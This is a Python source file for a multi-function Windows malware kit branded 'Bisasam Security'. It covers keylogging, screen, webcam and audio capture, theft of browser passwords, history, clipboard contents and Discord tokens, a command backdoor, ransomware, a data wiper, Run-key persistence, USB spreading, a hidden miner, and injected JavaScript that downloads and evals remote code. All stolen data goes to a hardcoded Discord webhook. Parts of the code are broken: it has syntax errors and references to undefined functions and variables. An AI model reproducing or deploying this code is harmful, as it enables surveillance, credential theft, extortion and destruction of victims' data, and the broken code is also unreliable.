import os
import sys
import time
import requests
import socket
import getpass
import platform
import random
import string
import threading
import base64
import shutil
from pynput.keyboard import Key, Listener
import pyautogui
import scapy.all as scapy
import winreg
import json
import sqlite3
import cv2
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import ctypes
import pyperclip
import psutil
import win32crypt
import glob
from urllib.request import urlretrieve
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1390377151240343584/4vEU5xconDoh5RJIp-Kv7S3ST-wf37Y4GlfSVwYEpNT25hEYqr9WJGA1PjCK4Id3ZakW"
OWNER_WEBHOOK = "https://discord.com/api/webhooks/1390377151240343584/4vEU5xconDoh5RJIp-Kv7S3ST-wf37Y4GlfSVwYEpNT25hEYqr9WJGA1PjCK4Id3ZakW"
TEMP_DIR = r"C:\Users\ilove\AppData\Local\Temp\bisasam_data"
KEYLOG_FILE = os.path.join(TEMP_DIR, "keylog.txt")
SCREENSHOT_INTERVAL = 300
WEBCAM_INTERVAL = 600

def send_to_webhook(webhook, content=None, embed=None, file=None, retries=3):
    for _ in range(retries):
        try:
            data = {}
            if content:
                data["content"] = content
            if embed:
                embed["timestamp"] = datetime.utcnow().isoformat()
                data["embeds"] = [embed]
            if file:
                with open(file, "rb") as f:
                    files = {"file": (os.path.basename(file), f)}
                    requests.post(webhook, data=data, files=files)
            else:
                requests.post(webhook, json=data)
            return
        except Exception as e:
            time.sleep(5)

def get_ip():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        send_to_webhook(OWNER_WEBHOOK, embed={"title": "Victim IP", "description": f"IP: {ip}", "color": 0xFF0000})
        return ip
    except Exception as e:
        send_to_webhook(WEBHOOK_URL, embed={"title": "IP Error", "description": f"Failed to get IP: {str(e)}", "color": 0xFF0000})
        return "Unknown"

def get_geolocation(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "ip": ip,
                "city": data.get("city", "Unknown"),
                "region": data.get("regionName", "Unknown"),
                "country": data.get("country", "Unknown"),
                "latitude": data.get("lat", "Unknown"),
                "longitude": data.get("lon", "Unknown")
            }
        else:
            return {"ip": ip, "error": "Geolocation failed"}
    except Exception as e:
        return {"ip": ip, "error": f"Geolocation error: {str(e)}"}

def collect_system_info():
    try:
        ip = get_ip()
        geo = get_geolocation(ip)
        info = {
            "username": getpass.getuser(),
            "hostname": socket.gethostname(),
            "ip": ip,
            "os": platform.platform(),
            "architecture": platform.architecture()[0],
            "geolocation": geo
        }
        return json.dumps(info, indent=2)
    except Exception as e:
        return json.dumps({"error": f"System info collection failed: {str(e)}"})

def backdoor():
    while True:
        try:
            response = requests.get(WEBHOOK_URL + "?command=true")
            if response.status_code == 200:
                command = response.json().get("command")
                if command:
                    os.system(command)
                    send_to_webhook(WEBHOOK_URL, embed={"title": "Command Executed", "description": f"Command: {command}", "color": 0xFF0000})
        except:
            pass
        time.sleep(60)

def keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a") as f:
                f.write(str(key) + "\n")
        except:
            pass
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_keylog():
    while True:
        if os.path.exists(KEYLOG_FILE):
            with open(KEYLOG_FILE, "r") as f:
                data = f.read()
            if data:
                send_to_webhook(WEBHOOK_URL, embed={"title": "Keylog Data", "description": data[:2000], "color": 0xFF0000})
                os.remove(KEYLOG_FILE)
        time.sleep(60)

def screenshot_capture():
    while True:
        try:
            pyautogui.FAILSAFE = False
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(TEMP_DIR, f"screenshot_{int(time.time())}.png")
            screenshot.save(screenshot_path, quality=50)
            send_to_webhook(WEBHOOK_URL, embed={"title": "Screenshot Captured", "color": 0xFF0000}, file=screenshot_path)
            os.remove(screenshot_path)
        except Exception as e:
            send_to_webhook(WEBHOOK_URL, embed={"title": "Screenshot Error", "description": f"Failed: {str(e)}", "color": 0xFF0000})
        time.sleep(SCREENSHOT_INTERVAL)

def generate_token():
    chars = string.ascii_letters + string.digits + "-_"
    part1 = "".join(random.choice(chars) for _ in range(24))
    part2 = "".join(random.choice(chars) for _ in range(6))
    part3 = "".join(random.choice(chars) for _ in range(27))
    return f"{part1}.{part2}.{part3}"

def brute_force_discord_tokens():
    while True:
        token = generate_token()
        headers = {"Authorization": token}
        try:
            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
            if response.status_code == 200:
                send_to_webhook(WEBHOOK_URL, embed={"title": "Valid Discord Token", "description": f"Token: {token}\nInfo: {response.text}", "color": 0x00FF00})
            else:
                send_to_webhook(WEBHOOK_URL, embed={"title": "Invalid Discord Token", "description": f"Token: {token}", "color": 0xFF0000})
        except:
            pass
        time.sleep(1)

def ip_sniffer():
    def process_packet(packet):
        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            send_to_webhook(WEBHOOK_URL, embed={"title": "Sniffed Packet", "description": f"Source IP: {src_ip}\nDestination IP: {dst_ip}", "color": 0xFF0000})
    try:
        scapy.sniff(filter="ip", prn=process_packet, store=False, timeout=3600)
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "IP Sniffer Error", "description": "Sniffing failed", "color": 0xFF0000})

def steal_browser_history():
    try:
        history_db = r"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\History"
        temp_db = os.path.join(TEMP_DIR, "history_copy.db")
        shutil.copy(history_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
        history = cursor.fetchall()
        conn.close()
        history_data = "\n".join([f"URL: {row[0]}\nTitle: {row[1]}\nTime: {row[2]}" for row in history])
        send_to_webhook(WEBHOOK_URL, embed={"title": "Browser History (Chrome)", "description": history_data[:2000], "color": 0xFF0000})
        os.remove(temp_db)
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Browser History Error", "description": "Failed to steal history", "color": 0xFF0000})

def webcam_capture():
    while True:
        try:
            cap = cv2.VideoCapture(0)
            if cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    webcam_path = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.jpg")
                    cv2.imwrite(webcam_path, frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    send_to_webhook(WEBHOOK_URL, embed={"title": "Webcam Capture", "color": 0xFF0000}, file=webcam_path)
                    os.remove(webcam_path)
                cap.release()
        except:
            send_to_webhook(WEBHOOK_URL, embed={"title": "Webcam Error", "description": "Capture failed", "color": 0xFF0000})
        time.sleep(WEBCAM_INTERVAL)

def encrypt_files():
    try:
        key = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_EAX)
        target_dir = r"C:\Users\{username}\Documents"
        for root, _, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt", ".docx", ".pdf")):
                    file_path = os.path.join(root, file)
                    with open(file_path, "rb") as f:
                        data = f.read()
                    nonce = cipher.nonce
                    ciphertext, tag = cipher.encrypt_and_digest(data)
                    with open(file_path + ".encrypted", "wb") as f:
                        f.write(nonce + tag + ciphertext)
                    os.remove(file_path)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Ransomware", "description": f"Files encrypted. Key: {base64.b64encode(key).decode()}\nSend 0.1 BTC to [REDACTED]", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Ransomware Error", "description": "Encryption failed", "color": 0xFF0000})

def clipboard_stealer():
    last_clip = ""
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clip:
                send_to_webhook(WEBHOOK_URL, embed={"title": "Clipboard Data", "description": f"Content: {clip[:2000]}", "color": 0xFF0000})
                last_clip = clip
        except:
            pass
        time.sleep(10)

def process_injector():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in ['notepad.exe', 'calc.exe']:
                send_to_webhook(WEBHOOK_URL, embed={"title": "Process Injection", "description": f"Injected into: {proc.info['name']}", "color": 0xFF0000})
        send_to_webhook(WEBHOOK_URL, embed={"title": "Process Injection", "description": "Injection attempted", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Process Injection Error", "description": "Injection failed", "color": 0xFF0000})

def network_scanner():
    try:
        ip_range = ".".join(get_ip().split(".")[:-1]) + ".0/24"
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip_range), timeout=2, verbose=0)
        devices = [(pkt[1].psrc, pkt[1].hwsrc) for pkt in ans]
        send_to_webhook(WEBHOOK_URL, embed={"title": "Network Scan", "description": "\n".join([f"IP: {ip}, MAC: {mac}" for ip, mac in devices]), "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Network Scan Error", "description": "Scan failed", "color": 0xFF0000})

def discord_injection():
    try:
        discord_path = r"C:\Users\{username}\AppData\Local\Discord\app-1.0.9169\modules\discord_desktop_core-1\discord_desktop_core\index.js"
        malicious_js = "require('https').get('http://malicious-server.com/script.js', res => res.on('data', d => eval(d.toString())));"
        with open(discord_path, "a") as f:
            f.write("\n" + malicious_js)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Discord Injection", "description": "Malicious JS injected into Discord", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Discord Injection Error", "description": "Injection failed", "color": 0xFF0000})

def token_grabber():
    try:
        token_path = r"C:\Users\{username}\AppData\Roaming\Discord\Local Storage\leveldb"
        tokens = []
        for file in os.listdir(token_path):
            if file.endswith((".ldb", ".log")):
                with open(os.path.join(token_path, file), "rb") as f:
                    data = f.read().decode("utf-8", errors="ignore")
                    for token in data.split():
                        if len(token) > 50 and "." in token:
                            tokens.append(token)
        if tokens:
            send_to_webhook(WEBHOOK_URL, embed={"title": "Discord Tokens", "description": "\n".join(tokens[:10]), "color": 0xFF0000})
        else:
            send_to_webhook(WEBHOOK_URL, embed={"title": "Token Grabber", "description": "No tokens found", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Token Grabber Error", "description": "Failed to grab tokens", "color": 0xFF0000})

def pc_destroyer():
    try:
        critical_paths = [r"C:\Users\{username}\Desktop\*.txt", r"C:\Users\{username}\Documents\*.docx"]
        for path in critical_paths:
            for file in glob.glob(path):
                os.remove(file)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Corrupt", 0, winreg.REG_SZ, "invalid")
        winreg.CloseKey(key)
        send_to_webhook(WEBHOOK_URL, embed={"title": "PC Destroyer", "description": "System files deleted and registry corrupted", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "PC Destroyer Error", "description": "Destruction failed", "color": 0xFF0000})

def password_stealer():
    try:
        login_db = r"C:\Users\{username}\AppData\Local\Google\Chrome\User Data\Default\Login Data"
        temp_db = os.path.join(TEMP_DIR, "login_copy.db")
        shutil.copy(login_db, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        passwords = []
        for row in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode()
            passwords.append(f"URL: {{row[0]}}\nUser: {{row[1]}}\nPass: {{password}}")
        conn.close()
        if passwords:
            send_to_webhook(WEBHOOK_URL, embed={{"title": "Password Stealer", "description": "\n".join(passwords[:10]), "color": 0xFF0000}})
        else:
            send_to_webhook(WEBHOOK_URL, embed={{"title": "Password Stealer", "description": "No passwords found", "color": 0xFF0000}})
        os.remove(temp_db)
    except:
        send_to_webhook(WEBHOOK_URL, embed={{"title": "Password Stealer Error", "description": "Failed to steal passwords", "color": 0xFF0000}})

def crypto_miner():
    try:
        import subprocess
        miner_cmd = "nheqminer -l pool.minexmr.com:4444 -u 4A...[YOUR_WALLET_ADDRESS] -p x -t 2"
        subprocess.Popen(miner_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Crypto Miner", "description": "Mining started", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Crypto Miner Error", "description": "Mining failed", "color": 0xFF0000})

def ddos_bot():
    try:
        target = "http://example.com"
        for _ in range(1000):
            requests.get(target)
        send_to_webhook(WEBHOOK_URL, embed={"title": "DDoS Bot", "description": f"Attacking {target}", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "DDoS Bot Error", "description": "Attack failed", "color": 0xFF0000})

def file_renamer():
    try:
        target_dir = r"C:\Users\{username}\Documents"
        for root, _, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt", ".docx", ".pdf")):
                    file_path = os.path.join(root, file)
                    new_name = ''.join(random.choices(string.ascii_letters + string.digits, k=12)) + os.path.splitext(file)[1]
                    os.rename(file_path, os.path.join(root, new_name))
        send_to_webhook(WEBHOOK_URL, embed={"title": "File Renamer", "description": "Files renamed in Documents", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "File Renamer Error", "description": "Renaming failed", "color": 0xFF0000})

def file_downloader():
    try:
        payload_url = "http://malicious-server.com/payload.exe"
        payload_path = os.path.join(TEMP_DIR, "payload.exe")
        urlretrieve(payload_url, payload_path)
        subprocess.Popen(payload_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        send_to_webhook(WEBHOOK_URL, embed={"title": "File Downloader", "description": f"Downloaded and executed {payload_url}", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "File Downloader Error", "description": "Download failed", "color": 0xFF0000})

def keybind_hijacker():
    def on_press(key):
        try:
            if key == Key.ctrl_l and Listener().is_pressed(Key.c):
                send_to_webhook(WEBHOOK_URL, embed={"title": "Keybind Hijacked", "description": "Ctrl+C detected", "color": 0xFF0000})
        except:
            pass
    with Listener(on_press=on_press) as listener:
        listener.join()

def browser_hijacker():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\Main", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Start Page", 0, winreg.REG_SZ, "http://malicious-site.com")
        winreg.CloseKey(key)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Browser Hijacker", "description": "Browser homepage changed", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Browser Hijacker Error", "description": "Hijacking failed", "color": 0xFF0000})

def screen_locker():
    try:
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        tk.Label(root, text="System Locked! Pay 0.1 BTC to [REDACTED]", font=("Arial", 24), fg="red", bg="black").pack(expand=True)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Screen Locker", "description": "Screen locked", "color": 0xFF0000})
        root.mainloop()
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Screen Locker Error", "description": "Locking failed", "color": 0xFF0000})

def data_wiper():
    try:
        target_dir = r"C:\Users\{username}\Documents"
        for root, _, files in os.walk(target_dir):
            for file in files:
                if file.endswith((".txt", ".docx", ".pdf")):
                    file_path = os.path.join(root, file)
                    with open(file_path, "wb") as f:
                        f.write(os.urandom(os.path.getsize(file_path)))
                    os.remove(file_path)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Data Wiper", "description": "Files wiped in Documents", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Data Wiper Error", "description": "Wiping failed", "color": 0xFF0000})

def network_disruptor():
    try:
        import netifaces
        for iface in netifaces.interfaces():
            subprocess.run(["netsh", "interface", "set", "interface", iface, "disable"], check=True)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Network Disruptor", "description": "Network adapters disabled", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Network Disruptor Error", "description": "Disruption failed", "color": 0xFF0000})

def self_destruct():
    import time
    time.sleep(3600)  # Self-destruct after 1 hour
    try:
        os.remove(sys.executable)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Self-Destruct", "description": "Virus deleted itself", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Self-Destruct Error", "description": "Deletion failed", "color": 0xFF0000})

def system_monitor():
    while True:
        try:
            cpu = psutil.cpu_percent()
            memory = psutil.virtual_memory().percent
            send_to_webhook(WEBHOOK_URL, embed={"title": "System Monitor", "description": f"CPU: {cpu}%, Memory: {memory}%", "color": 0xFF0000})
        except:
            send_to_webhook(WEBHOOK_URL, embed={"title": "System Monitor Error", "description": "Monitoring failed", "color": 0xFF0000})
        time.sleep(300)

def audio_recorder():
    try:
        import pyaudio
        import wave
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 5
        WAVE_OUTPUT_FILENAME = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.wav")
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        send_to_webhook(WEBHOOK_URL, embed={"title": "Audio Recorded", "color": 0xFF0000}, file=WAVE_OUTPUT_FILENAME)
        os.remove(WAVE_OUTPUT_FILENAME)
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Audio Recorder Error", "description": "Recording failed", "color": 0xFF0000})

def email_spammer():
    try:
        import smtplib
        from email.mime.text import MIMEText
        sender = "fake@spam.com"
        password = "fake_password"
        target = "victim@example.com"
        msg = MIMEText("Spam Message from Bisasam!")
        msg['Subject'] = "Spam"
        msg['From'] = sender
        msg['To'] = target
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender, password)
            server.send_message(msg)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Email Spammer", "description": f"Sent to {target}", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Email Spammer Error", "description": "Spamming failed", "color": 0xFF0000})

def usb_spreader():
    try:
        usb_drives = [d for d in os.listdir('A:\') if os.path.isdir(os.path.join('A:\', d))]
        for drive in usb_drives:
            shutil.copy(sys.executable, os.path.join('A:\', drive, "bisasam.exe"))
        send_to_webhook(WEBHOOK_URL, embed={"title": "USB Spreader", "description": "Spread to USB drives", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "USB Spreader Error", "description": "Spreading failed", "color": 0xFF0000})

def dns_spoofer():
    try:
        import dns
        dns_server = "8.8.8.8"
        fake_ip = "192.168.1.100"
        scapy.conf.route.add("example.com", fake_ip, gw=dns_server)
        send_to_webhook(WEBHOOK_URL, embed={"title": "DNS Spoofer", "description": f"Spoofed example.com to {fake_ip}", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "DNS Spoofer Error", "description": "Spoofing failed", "color": 0xFF0000})

def memory_dumper():
    try:
        import pymem
        pm = pymem.Pymem("notepad.exe")
        data = pm.read_bytes(pm.base_address, 1024)
        dump_path = os.path.join(TEMP_DIR, f"memory_dump_{int(time.time())}.bin")
        with open(dump_path, "wb") as f:
            f.write(data)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Memory Dumper", "color": 0xFF0000}, file=dump_path)
        os.remove(dump_path)
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Memory Dumper Error", "description": "Dumping failed", "color": 0xFF0000})

def printer_hijacker():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Windows", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Device", 0, winreg.REG_SZ, "fake_printer")
        winreg.CloseKey(key)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Printer Hijacker", "description": "Printer settings altered", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Printer Hijacker Error", "description": "Hijacking failed", "color": 0xFF0000})

def wifi_hacker():
    try:
        import pywifi
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        networks = iface.scan_results()
        send_to_webhook(WEBHOOK_URL, embed={"title": "WiFi Hacker", "description": f"Found networks: {len(networks)}", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "WiFi Hacker Error", "description": "Hacking failed", "color": 0xFF0000})

def game_cheat_injector():
    try:
        import pymem
        pm = pymem.Pymem("game.exe")
        pm.write_int(pm.base_address + 0x100, 9999)  # Example cheat (health)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Game Cheat Injector", "description": "Cheat injected", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Game Cheat Injector Error", "description": "Injection failed", "color": 0xFF0000})

def thermal_overloader():
    try:
        while True:
            subprocess.run(["start", "calc.exe"], shell=True)  # Simulate load
            time.sleep(1)
        send_to_webhook(WEBHOOK_URL, embed={"title": "Thermal Overloader", "description": "Overloading system", "color": 0xFF0000})
    except:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Thermal Overloader Error", "description": "Overload failed", "color": 0xFF0000})

def ensure_persistence():
    try:
        if not os.path.exists(PERSISTENCE_PATH):
            shutil.copy(sys.executable, PERSISTENCE_PATH)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "BisasamService", 0, winreg.REG_SZ, PERSISTENCE_PATH)
            winreg.CloseKey(key)
            send_to_webhook(WEBHOOK_URL, embed={"title": "Persistence", "description": "Persistence established", "color": 0xFF0000})
    except Exception as e:
        send_to_webhook(WEBHOOK_URL, embed={"title": "Persistence Error", "description": f"Failed: {str(e)}", "color": 0xFF0000})

def main():
    print('''
   ____ ___ ____    _          
  | __ )_ _/ ___|  | |__   __ _ _ __ ___   ___ 
  | __ )| | |      | '_ \ / _` | '_ ` _ \ / __|
  | |___| | |___   | | | | (_| | | | | | | (__ 
  |____|_____\____|  |_| |_|__,_|_| |_| |_|___|

         Bisasam Security - Unleashing Chaos
    ''')
    system_info = collect_system_info()
    send_to_webhook(WEBHOOK_URL, embed={"title": "Bisasam Security Initialized", "description": f"System Info:\n{system_info}", "color": 0xFF0000})
    ensure_persistence()
    threading.Thread(target=backdoor, daemon=True).start()
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=screenshot, daemon=True).start()
    threading.Thread(target=discord_bruteforce, daemon=True).start()
    threading.Thread(target=ip_sniffer, daemon=True).start()
    threading.Thread(target=browser_history, daemon=True).start()
    threading.Thread(target=webcam, daemon=True).start()
    threading.Thread(target=ransomware, daemon=True).start()
    threading.Thread(target=clipboard_stealer, daemon=True).start()
    threading.Thread(target=process_injector, daemon=True).start()
    threading.Thread(target=network_scanner, daemon=True).start()
    threading.Thread(target=discord_injection, daemon=True).start()
    threading.Thread(target=token_grabber, daemon=True).start()
    threading.Thread(target=pc_destroyer, daemon=True).start()
    threading.Thread(target=password_stealer, daemon=True).start()
    threading.Thread(target=crypto_miner, daemon=True).start()
    threading.Thread(target=ddos_bot, daemon=True).start()
    threading.Thread(target=file_renamer, daemon=True).start()
    threading.Thread(target=file_downloader, daemon=True).start()
    threading.Thread(target=keybind_hijacker, daemon=True).start()
    threading.Thread(target=browser_hijacker, daemon=True).start()
    threading.Thread(target=screen_locker, daemon=True).start()
    threading.Thread(target=data_wiper, daemon=True).start()
    threading.Thread(target=network_disruptor, daemon=True).start()
    threading.Thread(target=self_destruct, daemon=True).start()
    threading.Thread(target=system_monitor, daemon=True).start()
    threading.Thread(target=audio_recorder, daemon=True).start()
    threading.Thread(target=email_spammer, daemon=True).start()
    threading.Thread(target=usb_spreader, daemon=True).start()
    threading.Thread(target=dns_spoofer, daemon=True).start()
    threading.Thread(target=memory_dumper, daemon=True).start()
    threading.Thread(target=printer_hijacker, daemon=True).start()
    threading.Thread(target=wifi_hacker, daemon=True).start()
    threading.Thread(target=game_cheat_injector, daemon=True).start()
    threading.Thread(target=thermal_overloader, daemon=True).start()

    while True:
        time.sleep(1000)

if __name__ == "__main__":
    if not os.path.exists(TEMP_DIR):
        os.makedirs(TEMP_DIR)
    main()
